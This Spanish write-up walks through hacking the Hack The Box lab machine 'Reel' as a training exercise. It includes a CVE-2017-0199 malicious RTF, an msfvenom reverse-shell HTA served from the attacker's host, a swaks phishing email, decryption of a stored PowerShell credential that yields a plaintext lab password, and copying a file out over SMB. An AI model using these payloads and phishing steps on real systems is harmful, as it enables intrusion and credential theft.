---
title: "HTB: Resolución de Reel"
date: 2023-08-02 00:00:00 +/-TTTT
categories: [HTB, Active Directory]
tags: [ftp, smtp, exiftool, cve-2017-0199, phising, rtf, hta, smbserver, msfvenom, swaks, acl, pscredential, writeowner, writedacl]     # TAG names should always be lowercase
image: reel.png
img_path: /photos/2023-08-02-Reel-WriteUp/
---

**Reel** es una máquina **Windows** de **dificultad alta** centrada en **Active Directory**, con una configuración de servicios expuestos poco común. El desafío empieza con el aprovechamiento de información obtenida de un servicio **FTP**, para generar un archivo **RTF malicioso**. Este archivo se envía por medio del servicio **SMTP** abierto en una estrategia que simula un ataque de **phishing**, lo que permite lograr un primer acceso remoto al sistema. 

El principal reto de esta máquina radica en la **explotación** de las **Listas de Control de Acceso (ACLs)** que se encuentran **configuradas incorrectamente**. Esto da lugar a una **escalada de privilegios a través de múltiples usuarios**, poniendo de manifiesto las amenazas que pueden surgir a raíz de una configuración de seguridad insuficiente en **Active Directory**.


## Reconocimiento

En esta etapa, nos esforzamos por recopilar la mayor cantidad de información posible sobre nuestro objetivo.

### Identificación del Sistema Operativo con Ping

Empezamos por realizar un _**ping**_ a la máquina víctima. La finalidad del _ping_ no es solamente confirmar la conectividad, sino también deducir el sistema operativo que la máquina víctima está utilizando. ¿Cómo lo hace? Por medio del _**Time to Live (TTL)**_.

El _**TTL**_ indica cuánto tiempo o "saltos" debe permanecer el paquete en la red antes de que se descarte. Los sistemas operativos establecen diferentes valores predeterminados de TTL para los paquetes que salen, por lo que podemos usar el TTL para obtener una idea del sistema operativo del host remoto.

En este caso, un _**TTL**_ menor o igual a **64** generalmente indica que la máquina es **Linux** y un _**TTL**_ menor o igual a **128** indica que la máquina es **Windows**.

```bash
r1pfr4n@parrot>  ping -c 1 10.10.10.77 

PING 10.10.10.77 (10.10.10.77) 56(84) bytes of data.
64 bytes from 10.10.10.77: icmp_seq=1 ttl=127 time=118 ms

--- 10.10.10.77 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 117.508/117.508/117.508/0.000 ms
```

Observamos que el _**TTL**_ es 127, lo que sugiere que nos enfrentamos a una máquina **Windows**.

  
### Descubrimiento de puertos

El próximo paso en nuestro proceso de exploración es descubrir los puertos abiertos en la máquina víctima. Para ello, utilizamos la herramienta **nmap**. Nmap nos permite identificar los **puertos abiertos** (status open) en la máquina, que podrían ser potenciales vectores de ataque.

El comando que utilizamos es bastante detallado y hace uso de varias opciones de nmap:

-   `-sS`: Realiza un escaneo SYN. Este es un tipo de escaneo sigiloso que no completa las conexiones TCP a los puertos del host objetivo.
-   `--min-rate 5000`: Establece el número mínimo de paquetes que nmap intentará enviar por segundo.
-   `-n`: No resuelve los nombres de los hosts.
-   `-Pn`: Trata al host como si estuviera en línea y omite la fase de descubrimiento.
-   `-p-`: Escanea todos los puertos (equivalente a `-p 1-65535`).
-   `-vvv`: Aumenta la verbosidad del programa. 
-   `--open`: Muestra solo los puertos abiertos.
-   `-oG allPorts`: Guarda la salida en formato *greppable*, que es más fácil de procesar con otros programas y scripts (este formato lo utilizo para poder filtrar los puertos abiertos de los resultados del escaneo mediante expresiones regulares).

Aquí están los resultados:

```bash
r1pfr4n@parrot> sudo nmap -sS --min-rate 5000 -n -Pn -p- -vvv --open 10.10.10.77 -oG allPorts

...[snip]...
Nmap scan report for 10.10.10.77
Host is up, received user-set (0.12s latency).
Scanned at 2023-07-28 11:21:08 CEST for 26s
Not shown: 65527 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE        REASON
21/tcp    open  ftp            syn-ack ttl 127
22/tcp    open  ssh            syn-ack ttl 127
25/tcp    open  smtp           syn-ack ttl 127
135/tcp   open  msrpc          syn-ack ttl 127
139/tcp   open  netbios-ssn    syn-ack ttl 127
445/tcp   open  microsoft-ds   syn-ack ttl 127
593/tcp   open  http-rpc-epmap syn-ack ttl 127
49159/tcp open  unknown        syn-ack ttl 127
...[snip]...
```

Tras descubrir los puertos abiertos, procedemos a realizar un **escaneo más detallado** para conocer las versiones y los servicios que se están ejecutando en esos puertos.

```bash
r1pfr4n@parrot> sudo nmap -sCV -p21,22,25,135,139,445,593,49159 10.10.10.77 -oN targeted

Nmap scan report for 10.10.10.77
Host is up (0.12s latency).

PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_05-29-18  12:19AM       <DIR>          documents
22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)
| ssh-hostkey: 
|   2048 8220c3bd16cba29c88871d6c1559eded (RSA)
|   256 232bb80a8c1cf44d8d7e5e6458803345 (ECDSA)
|_  256 ac8bde251db7d838389b9c16bff63fed (ED25519)
25/tcp    open  smtp?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
|     220 Mail Service ready
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|   Hello: 
|     220 Mail Service ready
|     EHLO Invalid domain address.
|   Help: 
|     220 Mail Service ready
|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|   SIPOptions: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|   TerminalServerCookie: 
|     220 Mail Service ready
|_    sequence of commands
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49159/tcp open  msrpc        Microsoft Windows RPC
...[snip]...
Service Info: Host: REEL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -20m00s, deviation: 34m37s, median: -1s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: REEL
|   NetBIOS computer name: REEL\x00
|   Domain name: HTB.LOCAL
|   Forest name: HTB.LOCAL
|   FQDN: REEL.HTB.LOCAL
|_  System time: 2023-07-28T10:26:35+01:00
| smb2-time: 
|   date: 2023-07-28T09:26:38
|_  start_date: 2023-07-28T09:19:02
| smb2-security-mode: 
|   302: 
|_    Message signing enabled and required
```

El comando `-sCV` realiza un escaneo de versión (-sV) y ejecuta *scripts* por defecto (-sC).

El resultado de este escaneo revela información adicional sobre los servicios en ejecución, como versiones y detalles de la configuración. A continuación, se proporciona un desglose detallado de los servicios que se han identificado en la máquina objetivo utilizando una tabla. Para cada servicio, se describe brevemente su propósito y su relevancia potencial.

| Puerto(s) | Servicio | Descripción | Relevancia |
|--------|----------|-------------|------------|
| 21 | FTP | El protocolo de transferencia de archivos (FTP) se utiliza para transferir archivos de un host a otro. | Las conexiones anónimas a FTP pueden permitir la enumeración de archivos o la transferencia no autorizada de archivos. |
| 22 | SSH | OpenSSH ofrece conectividad cifrada a través de la red utilizando el protocolo ssh. | Las vulnerabilidades en SSH pueden permitir la ejecución remota de código o el acceso no autorizado. |
| 25 | SMTP | El protocolo de transferencia de correo simple (SMTP) se utiliza para el envío de correo electrónico. | Puede ser explotado para enviar correos con contenido malicioso, spam o la recopilación de información. |
| 135, 49159 | MSRPC | Microsoft Remote Procedure Call (RPC) permite a los procesos comunicarse en una red. | Los problemas de configuración o las vulnerabilidades en RPC pueden permitir la ejecución remota de código. |
| 139, 445 | NetBIOS-ssn/Microsoft-ds | NetBIOS y SMB son protocolos de compartición de archivos y servicios. | Las vulnerabilidades en SMB pueden permitir la ejecución remota de código, la escalada de privilegios o la revelación de información sensible. |
| 593 | ncacn_http | Es una implementación de RPC sobre HTTP en Windows. | Las vulnerabilidades o problemas de configuración pueden permitir la ejecución remota de código. | 


### Puertos 139/445 abiertos (SMB)

Se lleva a cabo un reconocimiento inicial del protocolo SMB (Server Message Block), que opera a través de los puertos 139 y 445, debido a su relevancia en la configuración de redes Windows y a su conocido historial de vulnerabilidades explotables.

SMB es un protocolo de red que **proporciona servicios compartidos de archivos e impresoras**. Es un componente esencial en los sistemas operativos Windows, pero también puede encontrarse en otras plataformas.

Para la recopilación de información sobre el servicio SMB que se ejecuta en la máquina objetivo, se utiliza la herramienta `crackmapexec` con el siguiente comando:

```bash
r1pfr4n@parrot> crackmapexec smb 10.10.10.77
```

![imagen 2](Pasted image 20230728112516.png)

Los resultados muestran que el nombre de la máquina es **"REEL"**, se utiliza el dominio **"HTB.LOCAL"**, y la opción de firmado SMB está habilitada (**signing: True**). El firmado SMB es una característica de seguridad que previene ataques man-in-the-middle al requerir que los paquetes SMB estén firmados digitalmente.  También podemos observar que la versión de Windows corresponde a **Windows Server 2012**. 

Para evitar problemas de resolución de nombres en el futuro, se añade el dominio "HTB.LOCAL" al archivo `/etc/hosts`:

![imagen 2](Pasted image 20230728112601.png)

A pesar de los intentos de enumerar los recursos compartidos disponibles utilizando `crackmapexec`, `smbclient` y `smbmap`, no se encuentran recursos compartidos accesibles. Los comandos utilizados son:

```bash
r1pfr4n@parrot> crackmapexec smb 10.10.10.77 -u '' -p '' --shares
r1pfr4n@parrot> smbclient -L 10.10.10.77 -N
r1pfr4n@parrot> smbmap -H 10.10.10.77 -u 'test'
```

Esto puede indicar que los recursos compartidos están restringidos a determinados usuarios, o simplemente que no existen en la máquina objetivo.

### Puerto 135 abierto (RPC)

RPC (Remote Procedure Call) es una tecnología que permite a un programa ejecutar código de manera remota. Ofrece múltiples oportunidades para la **enumeración de recursos del dominio**, incluyendo usuarios, grupos, políticas y más.

El comando utilizado para conectarse al servicio RPC es:

```bash
r1pfr4n@parrot> rpcclient -U "" -N 10.10.10.77
```

Desafortunadamente, los **intentos de enumerar** los usuarios y grupos del dominio utilizando una sesión de invitado **no tuvieron éxito**:

![imagen 2](Pasted image 20230728112906.png)

Esto sugiere que los permisos para enumerar los usuarios y grupos del dominio están restringidos en esta configuración específica. 

### Puerto 21 abierto (FTP)

El puerto 21 se asocia con el **protocolo FTP** (File Transfer Protocol), utilizado para la **transferencia de archivos** entre un cliente y un servidor en una red. En la fase de enumeración inicial, se detectó que la sesión de *anonymous* estaba **habilitada**. Esto significa que se permite el **acceso** al servidor FTP **sin requerir credenciales** de usuario válidas, permitiendo así a cualquier usuario anónimo interactuar con el servicio.

Para conectar con el servicio FTP, se utiliza el comando `ftp 10.10.10.77`, proporcionando `anonymous` como nombre de usuario y dejando la contraseña en blanco:

```bash
r1pfr4n@parrot> ftp 10.10.10.77
```

Una vez dentro del servicio, se observa una carpeta llamada `documents`. Dentro de esta carpeta se encuentran tres archivos: `readme.txt`, `AppLocker.docx` y `Windows Event Forwarding.docx`. Para descargar estos tres archivos en la máquina local, se realizan los siguientes comandos en el interior de `documents`:

```bash
ftp> prompt off
ftp> lcd /home/r1pfr4n/Desktop/HTB/Reel/content/ftp/
ftp> mget *
```

El comando `prompt off` desactiva la solicitud de confirmación para cada archivo descargado. El comando `lcd` cambia el directorio local en la máquina del atacante al especificado (**Nota**: previamente a la ejecución del comando `lcd`, se ha creado una carpeta *ftp* para almacenar estos tres archivos). Finalmente, `mget *` descarga todos los archivos del directorio actual en el servidor FTP a la máquina local.

Ejemplo de ejecución de los comandos anteriores:

![imagen 2](Pasted image 20230728113456.png)

Tras la descarga, se procede al análisis de los archivos. El archivo `readme.txt` contiene la siguiente información:

![imagen 2](Pasted image 20230728113649.png)

Es una nota pidiendo que se le envíen a un usuario documentos en **formato rtf** para revisar y convertir, **sugiriendo que la persona o sistema que procesa estos documentos podría ser vulnerable a un ataque**. La herramienta `exiftool`, que se utiliza para leer y escribir metadatos en una variedad de archivos, no encuentra ninguna información relevante en `readme.txt`.

El archivo `AppLocker.docx` menciona que están en vigor reglas de hash para `exe`, `msi` y scripts (`ps1`, `vbs`, `cmd`, `bat`, `js`):

![imagen 2](Pasted image 20230728171502.png)

Esto puede implicar que solo los archivos y scripts cuyos hash estén permitidos por la política de AppLocker podrán ejecutarse en el sistema.

Por último, aunque el archivo `Windows Event Forwarding.docx` parece estar corrupto y su contenido es inaccesible, un análisis con `exiftool` revela metadatos interesantes. En particular, se descubre una dirección de correo electrónico: `nico@megabank.com`:

![imagen 2](Pasted image 20230728114142.png)

Esta dirección de **correo electrónico** puede pertenecer a un usuario válido del sistema. Es posible **verificar** esto a través del **servicio SMTP** que se ejecuta en el puerto 25.

Con esto concluye el reconocimiento del servicio FTP, y se procede a la exploración del servicio SMTP.

### Puerto 25 abierto (SMTP)

El protocolo **Simple Mail Transfer Protocol** (SMTP), utilizado principalmente para **enviar correos electrónicos** entre servidores, puede proporcionar información valiosa durante la enumeración en una evaluación de seguridad. En particular, algunos comandos SMTP permiten la **enumeración de usuarios**, lo que puede revelar direcciones de correo electrónico válidas que se pueden explotar en ataques de phishing o intentos de inicio de sesión. 

Durante la fase inicial de enumeración con nmap, se identificaron varios comandos SMTP, entre ellos `DATA`, `HELO`, `EHLO`, `MAIL`, `NOOP`, `QUIT`, `RCPT`, `RSET`, `SAML`, `TURN` y `VRFY`. Es recomendable entender la funcionalidad de estos comandos:

- `DATA`: Inicia la transferencia de un mensaje de correo.
- `HELO`: Inicia la sesión SMTP.
- `EHLO`: Similar a HELO pero proporciona más información sobre el servidor.
- `MAIL`: Especifica el remitente del mensaje.
- `NOOP`: No realiza ninguna operación, se utiliza para mantener la conexión abierta.
- `QUIT`: Termina la sesión SMTP.
- `RCPT`: Especifica el destinatario del mensaje.
- `RSET`: Resetea la transacción actual.
- `SAML`: Es una versión de `MAIL` que permite el envío de mensajes a un usuario que está registrado pero no ha iniciado sesión.
- `TURN`: Cambia los roles de cliente y servidor.
- `VRFY`: Verifica la existencia de un usuario.

Algunos de estos comandos, como `VRFY`, `EXPN` y `RCPT`, pueden ser útiles para **enumerar usuarios**, aunque `VRFY` y `EXPN` a menudo están deshabilitados por razones de seguridad. En este caso, `RCPT` resulta particularmente útil para este propósito.

Para interactuar con el servicio SMTP se puede usar `telnet` junto con `rlwrap` para mejorar la interacción con la terminal. `rlwrap` permite recuperar comandos previamente ejecutados y moverse más fácilmente por la terminal. El comando sería el siguiente:

```bash
r1pfr4n@parrot> rlwrap telnet 10.10.10.77 25
```

Una vez establecida la conexión, se debe enviar un saludo al servidor SMTP con `HELO` o `EHLO`, este paso es necesario para establecer la comunicación con el servidor.

En el caso de este sistema en particular, se ha descubierto que los usuarios sin el dominio @megabank.com se consideran válidos. Por lo tanto, es importante centrarse en los **usuarios** **que se especifican con @megabank.com**, ya que el sistema distingue entre los usuarios válidos e inválidos en este dominio.

Para verificar la **validez de un usuario** a través del comando `RCPT`, es preciso seguir ciertos pasos que consisten en inicializar una transacción de correo y especificar un destinatario para dicho correo. Esto se hace con los comandos `MAIL FROM:` y `RCPT TO:`, respectivamente. Por ejemplo, primero se ejecuta un comando `MAIL FROM:`

```bash
MAIL FROM: <fran@fran.com>
```

Después de esto, se puede verificar la validez de un usuario con `RCPT TO:`. Por ejemplo, si se quiere comprobar la validez de "nico@megabank.com", se ejecuta:

```bash
RCPT TO: <nico@megabank.com>
```

Si el **usuario** es **válido**, el servidor debería devolver un "**250 Ok**", indicando que el usuario existe en el sistema. En contraposición, si se prueba con un **usuario** que **no existe** en el sistema, como `nico2@megabank.com`, el servidor debería devolver "**550 Unknown User**".

La imagen a continuación muestra la ejecución y los resultados de los comandos mencionados:

![imagen 2](Pasted image 20230728115236.png)

Como se ha mencionado antes, hay herramientas que automatizan la enumeración de usuarios a través de SMTP. Una de estas herramientas es `smtp-user-enum`, que facilita el proceso de enumeración utilizando el método `RCPT`. El siguiente comando muestra cómo usar `smtp-user-enum` para enumerar usuarios:

```bash
r1pfr4n@parrot> smtp-user-enum -M RCPT -U users.txt -t 10.10.10.77 -D megabank.com
```

Aquí, `-M RCPT` indica el método de enumeración (en este caso `RCPT`), `-U users.txt` es la ruta del archivo con una lista de nombres de usuario para probar, `-t 10.10.10.77` especifica la dirección IP del objetivo, y `-D megabank.com` es el dominio que se añadirá a los nombres de usuario.

La imagen a continuación muestra el resultado de la ejecución de la herramienta `smtp-user-enum`, donde se encuentra que `nico@megabank.com` es un usuario válido:

![imagen 2](Pasted image 20230728120331.png)

Con la confirmación de que `nico@megabank.com` es un usuario válido en el sistema, se concluye la enumeración del servicio SMTP.

## Consiguiendo Shell como Nico

Hasta ahora, la fase de reconocimiento ha proporcionado una serie de detalles valiosos sobre el sistema objetivo. Quizás el hallazgo más significativo fue el **contenido** del archivo `readme.txt` recuperado del servicio FTP, que incluía una solicitud para **enviar documentos en formato RTF** para su revisión y conversión. Este detalle sugiere una posible vulnerabilidad: la persona o el sistema que procesa estos documentos RTF podría ser susceptible a ciertos tipos de ataques.

Además, se ha confirmado que `nico@megabank.com` es un **usuario válido** del sistema, tal vez el destinatario indicado para estos documentos RTF. Considerando toda esta información, el siguiente paso lógico es investigar si existe alguna **vulnerabilidad** explotable que esté **asociada con el envío de documentos RTF**.

La investigación de este posible vector de ataque podría revelar una **oportunidad para ganar un shell en el sistema objetivo**. De ser así, el siguiente paso sería proceder con la explotación para conseguir una shell como el usuario Nico.

### Exploración de Vulnerabilidades - CVE-2017-0199

A través de la exploración de posibles vulnerabilidades, [se identifica el CVE-2017-0199](https://packetstormsecurity.com/files/142211/Microsoft-RTF-Remote-Code-Execution.html).

El **CVE-2017-0199** es una vulnerabilidad crítica que afecta a varias versiones de Microsoft Word y que permite la **ejecución remota de código**. Este CVE se aprovecha de la capacidad de Word para hacer **llamadas a Internet**. Un atacante puede crear un documento RTF (Formato de Texto Enriquecido) malicioso que, cuando se abre en una versión vulnerable de Word, llama a un servidor controlado por el atacante para recuperar un **archivo .hta** (Aplicación HTML).

Este archivo .hta es una especie de archivo ejecutable web que el atacante puede diseñar para llevar a cabo diversas acciones maliciosas, como la creación de una **shell inversa** en la máquina del objetivo. En este caso, nuestro **objetivo** es que, cuando Nico abra el documento RTF que le enviaremos, su versión vulnerable de Word haga una llamada GET a nuestro servidor y ejecute el archivo .hta que proporcionamos, generando una **shell inversa** que nos dará acceso a su sistema.

Esquema de ataque:

![imagen 2](Pasted image 20230728195311.png)

#### Creación del Archivo RTF Malicioso

Para crear este archivo **RTF malicioso**, utilizaremos una herramienta de la comunidad disponible en [este repositorio de GitHub](https://github.com/bhdresh/CVE-2017-0199). El script que nos interesa se llama `cve-2017-0199_toolkit.py` y está escrito en Python 2.

La ejecución de este script para generar nuestro archivo RTF malicioso sería la siguiente:

```bash
r1pfr4n@parrot> python2 cve-2017-0199_toolkit.py -M gen -w important.rtf -u http://10.10.14.11/revshell.hta -x 0
```

Vamos a desglosar los parámetros que utilizamos:

- `-M gen` indica al script que queremos generar (gen) un archivo RTF.
- `-w important.rtf` especifica el nombre de nuestro archivo RTF resultante.
- `-u http://10.10.14.11/revshell.hta` es la URL que será invocada cuando se abra el archivo RTF. Esta URL apunta a nuestro archivo .hta malicioso que alojaremos en nuestro servidor.
- `-x 0` indica que no queremos ofuscar el archivo RTF. Una opción de ofuscación podría ser útil para evadir algunas formas de detección, pero en este caso no es necesario.

#### Creación del Archivo .HTA Malicioso

Para crear el archivo **.hta malicioso**, utilizaremos la herramienta `msfvenom`. Primero, comprobamos si la herramienta ofrece el formato .hta con el siguiente comando:

```bash
r1pfr4n@parrot> msfvenom --list formats | grep hta
```

Una vez identificado el formato (en nuestro caso, **hta-psh**), ejecutamos el siguiente comando para crear nuestro archivo .hta malicioso:

```bash
r1pfr4n@parrot> msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=443 -f hta-psh > revshell.hta
```

De nuevo, vamos a desglosar los parámetros que utilizamos:

- `-p windows/x64/shell_reverse_tcp` indica que queremos crear una shell inversa TCP para una máquina Windows x64.
- `LHOST=10.10.14.11` y `LPORT=443` especifican nuestra dirección IP y puerto, respectivamente. Estos serán el destino de la shell inversa una vez se ejecute el archivo .hta.
- `-f hta-psh` indica que queremos que la salida esté en formato .hta.
- `> revshell.hta` redirige la salida del comando a nuestro archivo `revshell.hta`.

#### Despliegue del Servidor y Escucha para la Shell Inversa

Antes de enviar nuestro archivo RTF malicioso, necesitamos asegurarnos de que nuestro archivo .**hta malicioso está disponible para que el sistema objetivo lo descargue**. Para ello, desplegamos un servidor web simple con Python utilizando el siguiente comando:

```bash
r1pfr4n@parrot> sudo python3 -m http.server 80
```

Este comando inicia un servidor HTTP en el puerto 80, que es el puerto por defecto para las comunicaciones HTTP.

También necesitamos poner en escucha nuestra máquina para **recibir la shell inversa** una vez se ejecute el archivo .hta. Para ello, utilizamos el siguiente comando:

```bash
r1pfr4n@parrot> sudo rlwrap nc -nlvp 443
```

Este comando inicia una escucha en el puerto 443, que es el puerto que especificamos cuando creamos nuestro archivo .hta con `msfvenom`. 

- `rlwrap` es una herramienta que nos proporciona funcionalidad de línea de comandos como la edición de línea y el historial.
- `nc` es Netcat, una herramienta de red que puede establecer conexiones TCP/UDP entrantes y salientes.
- `-n` le dice a Netcat que no intente resolver nombres de host.
- `-l` pone a Netcat en modo de escucha para conexiones entrantes.
- `-v` hace que Netcat sea más verboso, lo que puede ser útil para la depuración.
- `-p 443` especifica el puerto en el que Netcat debe escuchar.

#### Envío del Archivo RTF al Usuario Nico

Finalmente, estamos listos para **enviar** nuestro **archivo RTF a Nico** utilizando la herramienta `swaks`. Es importante mencionar que, en un entorno real, la efectividad de un ataque de phishing depende en gran medida de cuán atractiva o "jugosa" sea la información presentada al usuario objetivo. En este caso, dado que se trata de un laboratorio y no una persona real quien abre los correos, hemos nombrado al archivo como `important.rtf`. Aunque este nombre no es particularmente llamativo, proporciona una aproximación al tipo de estrategias que podrían emplearse para atraer la atención del usuario. Además, hemos escogido "Important" como asunto del correo para aumentar la probabilidad de que Nico lo abra. 

```bash
r1pfr4n@parrot> swaks --to nico@megabank.com --from fran@fran.com --server 10.10.10.77 --header "Subject: Important" --attach-type 'application/rtf' --attach 'important.rtf'
```

Vamos a desglosar los parámetros que utilizamos:

- `--to nico@megabank.com` especifica el destinatario del correo.
- `--from fran@fran.com` especifica el remitente del correo.
- `--server 10.10.10.77` especifica el servidor de correo al que se enviará el correo.
- `--header "Subject: Important"` establece el asunto del correo.
- `--attach-type 'application/rtf'` indica que vamos a adjuntar un archivo y especifica su tipo MIME.
- `--attach 'important.rtf'` adjunta nuestro archivo RTF malicioso al correo.

Una vez enviado el correo, si todo va según lo planeado, deberíamos recibir una shell inversa en nuestro sistema casi instantáneamente, ya que el usuario nico no tarda mucho en abrir el correo:

![imagen 2](Pasted image 20230728184944.png)

Esto concluye la fase de explotación y nos proporciona una **shell en el sistema objetivo como el usuario Nico**. En el [Anexo I](#anexo-i-descripción-del-proceso-automatizado-para-la-apertura-de-archivos-rtf), se detalla cómo el desarrollador de la máquina ha implementado este proceso de automatización de la apertura del archivo RTF enviado por el atacante. 

### user.txt

Encontraremos la **primera flag** en el directorio **Desktop** del usuario **nico**:

```powershell
type user.txt
2e48737a657****42105b8be83b7bb3f
```

## Consiguiendo Shell como Administrator

Tras obtener una **shell inversa como el usuario Nico**, el siguiente paso en este escenario es **escalar privilegios** dentro del dominio. Para esto, se debe realizar una serie de tareas de **enumeración** y explotación adicionales.

### Consiguiendo Shell como Tom

El primer paso para escalar privilegios será **pivotar del usuario Nico al usuario Tom**.

#### Adquisición de las Credenciales de Tom

En el **directorio** de escritorio (**Desktop**) del usuario Nico, se encuentra un archivo llamado `cred.xml`. Este archivo contiene un objeto serializado de PowerShell. En particular, es un objeto `System.Management.Automation.PSCredential`, utilizado en PowerShell para **almacenar y manipular credenciales**, que son pares de nombres de usuario y contraseñas.

```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">HTB\Tom</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
    </Props>
  </Obj>
</Objs>
```

En este objeto serializado, las propiedades relevantes son `UserName` y `Password`. El valor de `UserName` es `HTB\Tom`, indicando que estas son las credenciales de un usuario llamado Tom. La propiedad `Password` está cifrada, lo que requiere un paso adicional de descifrado.

El **descifrado de la contraseña** se puede lograr utilizando el siguiente comando:

```powershell
powershell -c "$cred = Import-CliXml -Path ./cred.xml; $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($cred.Password); $UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR); $cred.Username, $UnsecurePassword"
```

Este comando tiene varias partes:

1. `$cred = Import-CliXml -Path ./cred.xml`: Este fragmento importa el archivo `cred.xml` y lo asigna a la variable `$cred`.
2. `$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($cred.Password)`: Esto convierte la contraseña segura (SecureString) del objeto `$cred` en una cadena BSTR (Basic String), que es una cadena de texto de formato Unicode.
3. `$UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)`: Finalmente, esto convierte la cadena BSTR a una cadena de texto en formato claro (plaintext).
4. `$cred.Username, $UnsecurePassword`: Esto retorna el nombre de usuario y la contraseña en formato claro.

Tras la ejecución de este comando, se obtendrá el **nombre de usuario y la contraseña descifrada**. En este caso, la contraseña en texto claro del usuario Tom es `1ts-mag1c!!!`.

A continuación, se muestra la ejecución del comando que retorna el nombre de usuario y la contraseña del usuario Tom en formato claro:

![imagen 2](tom_creds.png)

#### Acceso SSH como Tom

En las etapas iniciales de la exploración, se identificó que el **puerto 22 (SSH) estaba en funcionamiento**. Esta información abre la posibilidad de establecer una conexión SSH utilizando las credenciales descifradas `tom:1ts-mag1c!!!`. Con estos datos en mano, podemos proceder a **intentar ganar una shell SSH** mediante el uso del comando `ssh tom@10.10.10.77`, proporcionando la contraseña cuando sea requerida. Si el proceso es exitoso, lograremos **acceso a una shell SSH** en el sistema **como el usuario Tom**.

![imagen 2](Pasted image 20230802120633.png)

### Consiguiendo Shell como Claire

El segundo paso para escalar privilegios será **pivotar del usuario Tom al usuario Claire**.

#### Exploración del Directorio AD Audit

Una vez que **se ha conseguido acceso como Tom**, se realiza una exploración adicional de su directorio de **escritorio**. Se descubre una carpeta llamada "**AD Audit**". Este nombre sugiere que podría contener información sobre auditorías realizadas en Active Directory.

Dentro de esta carpeta, encontramos varios archivos. De particular interés es un archivo llamado `note.txt`, que contiene las siguientes notas de auditoría:

![imagen 2](Pasted image 20230802121208.png)

Estas notas indican que no se encontraron caminos de ataque en AD desde el usuario hasta el administrador del dominio utilizando la consulta más corta predeterminada. Sin embargo, sugieren la posibilidad de volver a ejecutar la consulta contra otros grupos creados, lo que puede indicar que **existen rutas alternativas de ataque que aún no se han explorado**.

Dentro de la carpeta "AD Audit", también se encuentra una carpeta llamada BloodHound. **BloodHound** es una herramienta que se utiliza para visualizar relaciones de Active Directory. Ayuda a identificar caminos de ataque poco convencionales que de otro modo podrían pasar desapercibidos. La presencia de esta carpeta sugiere que se han realizado auditorías con esta herramienta.

Además, encontramos el famoso script **PowerView.ps1** en la misma carpeta. PowerView es una herramienta de PowerShell diseñada para explorar Active Directory y encontrar posibles caminos de ataque. También proporciona una variedad de funciones útiles para la explotación de entornos AD.

En una subcarpeta llamada "Ingestors", se encuentran dos elementos: **SharpHound** y un archivo llamado `acls.csv`. SharpHound es un recolector de datos para BloodHound, que recopila información sobre relaciones y permisos de Active Directory. El archivo `acls.csv`, por otro lado, parece contener datos sobre listas de control de acceso (ACLs). Estos datos pueden proporcionar **información importante sobre qué entidades tienen acceso a qué recursos**.

Con el fin de analizar el archivo `acls.csv` más a fondo, se decide trasladarlo a la máquina atacante. Para lograr esto, se implementa un servicio SMB en la máquina atacante utilizando el siguiente comando:

```bash
r1pfr4n@parrot> sudo smbserver.py shares $(pwd) -smb2support
```

`smbserver.py` es una herramienta que permite crear un servidor SMB para compartir archivos entre máquinas. El parámetro `shares` define el nombre del recurso compartido, `$(pwd)` toma el directorio de trabajo actual como la ubicación para compartir y `-smb2support` habilita el soporte para el protocolo SMBv2. 

En la máquina del DC, se utiliza el comando `copy` para transferir el archivo a la máquina atacante a través del recurso compartido SMB:

```powershell
copy acls.csv \\10.10.14.3\shares\acls.csv
```

#### Análisis de las ACLs

En el contexto de Active Directory, se manejan diferentes conceptos cuando se trata de asignar o limitar permisos y accesos a los diferentes objetos del dominio. Aquí es donde se introduce la Lista de Control de Acceso, o **ACL** por sus siglas en inglés (Access Control List).

